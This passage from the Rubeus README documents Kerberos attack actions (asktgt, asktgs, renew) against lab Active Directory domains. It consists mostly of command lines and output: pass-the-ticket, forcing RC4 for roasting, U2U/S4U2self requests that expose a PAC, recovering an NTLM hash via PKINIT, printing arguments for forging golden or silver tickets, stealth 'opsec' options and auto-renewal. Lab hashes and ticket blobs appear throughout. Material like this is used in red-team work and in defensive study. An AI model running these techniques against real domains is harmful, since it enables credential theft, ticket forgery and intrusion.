lYrCtWo2oEjBbYMb3YGTcWh5+oWNY1QdxSpyFc8IDQOTOCnQ+nsQf78phU7svTBm0b5AqqPD/olz1RYm\r\n        f4qR+90TcASaQGwHUQbpFnLb2U9BHwNS+SlRwafFT5qlTmXaqoQMMjknospm0+v0U8hd8KbZ4jwK2hM+\r\n        vE74bOiAMdjTf5YLDorRyuFUoa7oIaJZTXxsLmqZsBCsUnH5etXTb9vHj7Dl27wyP9snRHIWuE8Rdo9Z\r\n        zAJK6PESaBcUqhKqkjWLUKDuT2+SCduPVF6+3QJB0xLJrwXKp/MiV418H/pHRoy6JkKKw2m1bw45P8Az\r\n        l54g75WJqEiAzj/+I64TUfbEFJtd9OHujAKzjMMiKRQKwTKR1Jfb6gTrv6K0GCTJ15W84DeWc47jTutE\r\n        HbWxuKib3niTTM5YcHZcN6h/V8Zef8r4fdhY20xGCwqlT9X5md96+647bRq/AZDtiAEaVAH5f3QTQen8\r\n        o6XpVqSoZxRASEs3oKFfNunBFJ+QxOL4A47iO1JH0wlM7L2Vx+QeDMfqUh3i9S71YBLdHtPflo8ivmNS\r\n        gf0dIeAE2rHRNQn+q7vvrl4r/Bxy3CikzBWnq9Nff8vUJmZ0MQBc4mBpykuuFtLuEJOELdUzW4uCF/9a\r\n        JffKDnWk0lIDymImtxqTO0Y/mk0zEQ7RZNUIR3vtrNSO84CjZ/YFYCIdIR5wCzztPSZ0RH7C4lVueBO5\r\n        ZoDiWYvPuOQsZHkP2XD+GQtu0hN6MOfLOKGVmNrKs1KRfWhbqnTQudjFSkvgHlgjIslKJDa6WzmSQhdW\r\n        fPIA9ggjCmQtyB6seiYi9LdJuQ+GiiF2UphTEJ+a5DR6rGYbg4hhd+ru2Z8Lt5rBojliLnedafyZJ15t\r\n        alU+n8aNdIPXfVmsR3caTXkncNBlo4HWMIHToAMCAQCigcsEgch9gcUwgcKggb8wgbwwgbmgGzAZoAMC\r\n        ARehEgQQ+zY8adXi2NuvkAxl1ohUOKEPGw1URVNUTEFCLkxPQ0FMohIwEKADAgEBoQkwBxsFZGZtLmGj\r\n        BwMFAEDhAAClERgPMjAxOTAyMjUyMzA2MDdaphEYDzIwMTkwMjI2MDQwNjA3WqcRGA8yMDE5MDMwNDIz\r\n        MDYwN1qoDxsNVEVTVExBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNdGVzdGxhYi5sb2NhbA==\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  dfm.a\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  krbtgt/testlab.local\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  2/25/2019 3:06:07 PM\r\n    EndTime               :  2/25/2019 8:06:07 PM\r\n    RenewTill             :  3/4/2019 3:06:07 PM\r\n    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\r\n    KeyType               :  rc4_hmac\r\n    Base64(key)           :  +zY8adXi2NuvkAxl1ohUOA==\r\n\r\n\r\nRequesting a ticket via aes256_hmac hash for **dfm.a@testlab.local**, starting a new hidden process and applying the ticket to that logon session. **Note: elevation needed!**\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\\Windows\\System32\\cmd.exe\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Create Process (/netonly)\r\n\r\n    [*] Showing process : False\r\n    [+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\r\n    [+] ProcessID       : 7564\r\n    [+] LUID            : 0x3c4c241\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using aes256_cts_hmac_sha1 hash: e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27\r\n    [*] Target LUID : 63226433\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\dfm.a'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 234 bytes\r\n    [*] Received 1620 bytes\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFujCCBbagAwIBBaEDAgEWooIEvzCCBL...(snip)...\r\n\r\n    [*] Action: Import Ticket\r\n    [*] Target LUID: 0x3c4c241\r\n    [+] Ticket successfully imported!\r\n\r\n**Note that the /luid and /createnetonly parameters require elevation!**\r\n\r\nRequesting a ticket using a certificate and using `/getcredentials` to retrieve the NT hash:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgt /user:harmj0y /domain:rubeus.ghostpack.local /dc:pdc1.rubeus.ghostpack.local /getcredentials /certificate:MIIR3QIB...(snip)...QI/GZmyPRFEeE=\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using PKINIT with etype rc4_hmac and subject: CN=Harm J0y, CN=Users, DC=rubeus, DC=ghostpack, DC=local\r\n    [*] Building AS-REQ (w/ PKINIT preauth) for: 'rubeus.ghostpack.local\\harmj0y'\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIF9DCCBfCgAwIBBaEDAgEWooIE7DCCBOhhggTkMIIE4KADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          YnRndBsWcnViZXVzLmdob3N0cGFjay5sb2NhbA==\r\n\r\n      ServiceName              :  krbtgt/rubeus.ghostpack.local\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  harmj0y\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  14/07/2021 02:25:33\r\n      EndTime                  :  14/07/2021 12:25:33\r\n      RenewTill                :  21/07/2021 02:25:33\r\n      Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\r\n      KeyType                  :  rc4_hmac\r\n      Base64(key)              :  7MS2ajfZo4HedoK+K3dLcQ==\r\n      ASREP (key)              :  9B1C28A276FBBE557D0F9EE153FE24E1\r\n\r\n    [*] Getting credentials using U2U\r\n\r\n      CredentialInfo         :\r\n        Version              : 0\r\n        EncryptionType       : rc4_hmac\r\n        CredentialData       :\r\n          CredentialCount    : 1\r\n           NTLM              : C69A7EA908898C23B72E65329AF7E3E8\r\n\r\n\r\n### asktgs\r\n\r\nThe **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The `/ptt` flag will \"pass-the-ticket\" and apply the resulting service ticket to the current logon session. One or more `/service:X` SPNs **must** be specified, comma separated.\r\n\r\nThe supported encryption types in the constructed TGS-REQ will be RC4_HMAC, AES128_CTS_HMAC_SHA1, and AES256_CTS_HMAC_SHA1. In this case, the highest mutually supported encryption will be used by the KDC to build the returned service ticket. If you want to force DES, RC4, or AES128/256 keys, use `/enctype:[RC4|AES128|AES256|DES]`.\r\n\r\nIn order to request a service ticket for an account using an enterprise principal (i.e. *user@domain.com*), the `/enterprise` flag can be used.\r\n\r\nBy default, several differences exists between TGS-REQ's generated by Rubeus and genuine TGS-REQ's. To form TGS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will also cause an additional TGS-REQ to be sent automatically when a service ticket is requested for an account configured for unconstrained delegation. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used.\r\n\r\nTo play with other scenarios manually, `/tgs:X` can be used to supply an additional ticket which is appended to the request body. This also adds the constrained delegation KDC option as well as avoids dynamically determining the domain from the given SPN `/service:X`, for this reason the `/targetdomain:X` argument has been implemented to force the request to use the supplied domain which is useful for requesting delegated service tickets from a foreign domain or tickets with usual SPNs.\r\n\r\nThe `/u2u` flag was implemented to request User-to-User tickets. Together with the `/tgs:X` argument (used to supply the target accounts TGT), the `/service:X` argument can be the username of the account the supplied TGT is for (with the `/tgs:X` argument). The `/targetuser:X` argument will request a PAC of any other account by inserting a PA-FOR-USER PA data section with the `target user's` username.\r\n\r\nThe `/printargs` flag will print the arguments required to forge a ticket with the same PAC values if the PAC is readable. This could be done by supplying the `/servicekey:X` argument or performing a `/u2u` request with a known session key.\r\n\r\nUsing a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy\r\n\r\nThe `/keyList` flag was implemented for Kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). These requests must utilise a forged partial TGT from a read-only domain controller in the `/ticket:BASE64|FILE.KIRBI` parameter, further details on this forged TGT in the [golden](#golden) section. Furthermore, the `/spn:x` field must be set to the KRBTGT SPN within the domain, eg. KRBTBT/domain.local.\r\n\r\nRequesting a TGT for dfm.a and then using that ticket to request a service ticket for the \"LDAP/primary.testlab.local\" and \"cifs/primary.testlab.local\" SPNs:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\dfm.a'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 230 bytes\r\n    [*] Received 1537 bytes\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building TGS-REQ request for: 'LDAP/primary.testlab.local'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1514 bytes\r\n    [*] Received 1562 bytes\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFzjCCBcqgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building TGS-REQ request for: 'cifs/primary.testlab.local'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1514 bytes\r\n    [*] Received 1562 bytes\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFzjCCBcqgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n\r\n    C:\\Rubeus>Rubeus.exe klist\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (Current User)\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM\r\n        Server Name       : cifs/primary.testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : dfm.a @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)\r\n\r\n        [1] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM\r\n        Server Name       : LDAP/primary.testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : dfm.a @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)\r\n\r\n\r\nRequesting a service ticket for an AES-enabled service account, specifying that we _only_ support RC4_HMAC:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip).../service:roast/me /enctype:rc4\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.1\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Requesting 'rc4_hmac' etype for the service ticket\r\n    [*] Building TGS-REQ request for: 'roast/me'\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFrjCCBaqgAwIBBaEDA...(snip)...\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  dfm.a\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  roast/me\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  2/25/2019 3:10:59 PM\r\n    EndTime               :  2/25/2019 8:09:54 PM\r\n    RenewTill             :  3/4/2019 3:09:54 PM\r\n    Flags                 :  name_canonicalize, pre_authent, renewable, forwardable\r\n    KeyType               :  rc4_hmac\r\n    Base64(key)           :  Gg3zZicIl5c50KGecCf8XA==\r\n\r\nRequesting a user-to-user service ticket and including the *PA for User* PA-DATA section (an S4U2self request), it is possible to get a readable PAC for any user:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /u2u /targetuser:ccob /ticket:doIFijCCBYagAwIBBaED...(snip)...3RwYWNrLmxvY2Fs /tgs:doIFijCCBYagAwIBBaEDAg...(snip)...YWNrLmxvY2Fs\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: PDC1.rubeus.ghostpack.local (192.168.71.80)\r\n    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\r\n    [*] Building User-to-User TGS-REQ request for: 'exploitph'\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFKzCCBSegAwIBBaEDAgEWooIEKzCCBCdhggQjMIIEH6ADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          cGxvaXRwaA==\r\n\r\n      ServiceName              :  exploitph\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  ccob\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  20/07/2021 22:00:07\r\n      EndTime                  :  21/07/2021 07:59:39\r\n      RenewTill                :  27/07/2021 21:59:39\r\n      Flags                    :  name_canonicalize, pre_authent, renewable, forwardable\r\n      KeyType                  :  aes256_cts_hmac_sha1\r\n      Base64(key)              :  u2AYdjG4gLNIXqzb3MmwtDtE1k2NR5ty9h80w704+8Q=\r\n      Decrypted PAC            :\r\n        LogonInfo              :\r\n          LogonTime            : 01/01/1601 00:00:00\r\n          LogoffTime           :\r\n          KickOffTime          :\r\n          PasswordLastSet      : 20/07/2021 21:58:44\r\n          PasswordCanChange    : 21/07/2021 21:58:44\r\n          PasswordMustChange   : 31/08/2021 21:58:44\r\n          EffectiveName        : ccob\r\n          FullName             : C Cob\r\n          LogonScript          :\r\n          ProfilePath          :\r\n          HomeDirectory        :\r\n          HomeDirectoryDrive   :\r\n          LogonCount           : 0\r\n          BadPasswordCount     : 0\r\n          UserId               : 1109\r\n          PrimaryGroupId       : 513\r\n          GroupCount           : 1\r\n          Groups               : 513\r\n          UserFlags            : (32) EXTRA_SIDS\r\n          UserSessionKey       : 0000000000000000\r\n          LogonServer          : PDC1\r\n          LogonDomainName      : RUBEUS\r\n          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039\r\n          UserAccountControl   : (16) NORMAL_ACCOUNT\r\n          ExtraSIDCount        : 1\r\n          ExtraSIDs            : S-1-18-2\r\n          ResourceGroupCount   : 0\r\n        ClientName             :\r\n          Client Id            : 20/07/2021 21:59:39\r\n          Client Name          : ccob\r\n        UpnDns                 :\r\n          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL\r\n          UPN                  : ccob@rubeus.ghostpack.local\r\n          Flags                : 0\r\n        ServerChecksum         :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_MD5\r\n          Signature            : 79A2DC5595C76FA85155B4C65B3A0EE1 (VALID)\r\n        KDCChecksum            :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n          Signature            : DA57618BB48EA56371E374B1 (UNVALIDATED)\r\n\r\nIf the PAC can be decrypted (by using a user-to-user request or by passing the `/servicekey`) is it possible to print the arguments required to forge a ticket containg the same PAC values:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /service:roast/me /printargs /servicekey:9FFB199F118556F579B415270EE835005227FCBF29331DAC27C4397AC353F52B /ticket:doIF9DCCBfCgAwIBBaEDAg...(snip)...cGFjay5sb2NhbA==\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: PDC1.rubeus.ghostpack.local (192.168.71.80)\r\n    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\r\n    [*] Building TGS-REQ request for: 'roast/me'\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIF6jCCBeagAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          AgECoQ0wCxsFcm9hc3QbAm1l\r\n\r\n      ServiceName              :  roast/me\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  harmj0y\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  20/07/2021 00:02:27\r\n      EndTime                  :  20/07/2021 09:57:46\r\n      RenewTill                :  26/07/2021 23:57:46\r\n      Flags                    :  name_canonicalize, pre_authent, renewable, forwardable\r\n      KeyType                  :  aes256_cts_hmac_sha1\r\n      Base64(key)              :  U9Vnk0QnOmByQqF7i+5ujkinm9pRrevcRhw1sKVEVi4=\r\n      Decrypted PAC            :\r\n        LogonInfo              :\r\n          LogonTime            : 19/07/2021 23:00:38\r\n          LogoffTime           :\r\n          KickOffTime          :\r\n          PasswordLastSet      : 14/07/2021 02:07:12\r\n          PasswordCanChange    : 15/07/2021 02:07:12\r\n          PasswordMustChange   :\r\n          EffectiveName        : harmj0y\r\n          FullName             : Harm J0y\r\n          LogonScript          :\r\n          ProfilePath          :\r\n          HomeDirectory        :\r\n          HomeDirectoryDrive   :\r\n          LogonCount           : 8\r\n          BadPasswordCount     : 0\r\n          UserId               : 1106\r\n          PrimaryGroupId       : 513\r\n          GroupCount           : 1\r\n          Groups               : 513\r\n          UserFlags            : (32) EXTRA_SIDS\r\n          UserSessionKey       : 0000000000000000\r\n          LogonServer          : PDC1\r\n          LogonDomainName      : RUBEUS\r\n          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039\r\n          UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\r\n          ExtraSIDCount        : 1\r\n          ExtraSIDs            : S-1-18-1\r\n          ResourceGroupCount   : 0\r\n        CredentialInfo         :\r\n          Version              : 0\r\n          EncryptionType       : rc4_hmac\r\n          CredentialData    :   *** NO KEY ***\r\n        ClientName             :\r\n          Client Id            : 19/07/2021 23:57:46\r\n          Client Name          : harmj0y\r\n        UpnDns                 :\r\n          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL\r\n          UPN                  : harmj0y@rubeus.ghostpack.local\r\n          Flags                : 0\r\n        ServerChecksum         :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n          Signature            : 96FA020562EE73B38D31AEEF (VALID)\r\n        KDCChecksum            :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n          Signature            : E7FDCBAF5F580DFB567DF102 (UNVALIDATED)\r\n\r\n\r\n    [*] Printing argument list for use with Rubeus' 'golden' or 'silver' commands:\r\n\r\n    /user:harmj0y /id:1106 /pgid:513 /logoncount:8 /badpwdcount:0 /sid:S-1-5-21-3237111427-1607930709-3979055039 /netbios:RUBEUS /displayname:\"Harm J0y\" /groups:513 /sids:S-1-18-1 /pwdlastset:\"14/07/2021 02:07:12\" /minpassage:1d /dc:PDC1.RUBEUS.GHOSTPACK.LOCAL /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD\r\n\r\nUsing PKINIT to request a TGT and then requesting a user-to-user service ticket to gain access to the NTLM hash stored within the PAC (manually performing the `/getcredentials` flag to **asktgt**):\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /u2u /asrepkey:CC9D16AB01D1BD0EF9EBD53C8AD536D9 /ticket:doIF9DCCBfCgAwIBBaED...(snip)...ay5sb2NhbA== /tgs:doIF9DCCBfCgAwIBBaED...(snip)...ay5sb2NhbA==\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: PDC1.rubeus.ghostpack.local (192.168.71.80)\r\n    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\r\n    [*] Building User-to-User TGS-REQ request for: 'harmj0y'\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFxTCCBcGgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          RVVTLkdIT1NUUEFDSy5MT0NBTKkUMBKgAwIBAaELMAkbB2hhcm1qMHk=\r\n\r\n      ServiceName              :  harmj0y\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  harmj0y\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  19/07/2021 23:01:05\r\n      EndTime                  :  20/07/2021 09:00:38\r\n      RenewTill                :  26/07/2021 23:00:38\r\n      Flags                    :  name_canonicalize, pre_authent, renewable, forwardable\r\n      KeyType                  :  rc4_hmac\r\n      Base64(key)              :  Qm9zdwFIINSHAAmqaviuEw==\r\n      ASREP (key)              :  CC9D16AB01D1BD0EF9EBD53C8AD536D9\r\n      Decrypted PAC            :\r\n        LogonInfo              :\r\n          LogonTime            : 19/07/2021 22:59:21\r\n          LogoffTime           :\r\n          KickOffTime          :\r\n          PasswordLastSet      : 14/07/2021 02:07:12\r\n          PasswordCanChange    : 15/07/2021 02:07:12\r\n          PasswordMustChange   :\r\n          EffectiveName        : harmj0y\r\n          FullName             : Harm J0y\r\n          LogonScript          :\r\n          ProfilePath          :\r\n          HomeDirectory        :\r\n          HomeDirectoryDrive   :\r\n          LogonCount           : 7\r\n          BadPasswordCount     : 0\r\n          UserId               : 1106\r\n          PrimaryGroupId       : 513\r\n          GroupCount           : 1\r\n          Groups               : 513\r\n          UserFlags            : (32) EXTRA_SIDS\r\n          UserSessionKey       : 0000000000000000\r\n          LogonServer          : PDC1\r\n          LogonDomainName      : RUBEUS\r\n          LogonDomainId        : S-1-5-21-3237111427-1607930709-3979055039\r\n          UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\r\n          ExtraSIDCount        : 1\r\n          ExtraSIDs            : S-1-18-1\r\n          ResourceGroupCount   : 0\r\n        CredentialInfo         :\r\n          Version              : 0\r\n          EncryptionType       : rc4_hmac\r\n          CredentialData       :\r\n            CredentialCount    : 1\r\n              NTLM             : C69A7EA908898C23B72E65329AF7E3E8\r\n        ClientName             :\r\n          Client Id            : 19/07/2021 23:00:38\r\n          Client Name          : harmj0y\r\n        UpnDns                 :\r\n          DNS Domain Name      : RUBEUS.GHOSTPACK.LOCAL\r\n          UPN                  : harmj0y@rubeus.ghostpack.local\r\n          Flags                : 0\r\n        ServerChecksum         :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_MD5\r\n          Signature            : ADEC4A1A7DF70D0A61047E510E778454 (VALID)\r\n        KDCChecksum            :\r\n          Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n          Signature            : 6CF688E02147BEEC168E0125 (UNVALIDATED)\r\n\r\n**Note The `/asrepkey` from the TGT retrival must be passed to decrypted the CredentialData section where the NTLM hash is stored but the `/servicekey` argument is not required here as the session key from the TGT is being used because it is a user-to-user request.\r\n\r\n### renew\r\n\r\nThe **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The `/ptt` flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session.\r\n\r\nNote that TGTs MUST be renewed before their EndTime, within the RenewTill window.\r\n\r\n    C:\\Rubeus>Rubeus.exe renew /ticket:ticket.kirbi /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: Renew TGT\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\\dfm.a'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 1506 bytes\r\n    [*] Received 1510 bytes\r\n    [+] TGT renewal request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n\r\nThe `/autorenew` flag will take an existing `/ticket:X` .kirbi file/blob, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.\r\n\r\n    C:\\Rubeus>Rubeus.exe renew /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /autorenew\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v1.3.3\r\n\r\n    [*] Action: Auto-Renew TGT\r\n\r\n\r\n    [*] User       : dfm.a@TESTLAB.LOCAL\r\n    [*] endtime    : 2/10/2019 11:44:09 PM\r\n    [*] renew-till : 2/17/2019 6:44:09 PM\r\n    [*] Sleeping for 263 minutes (endTime-30) before the next 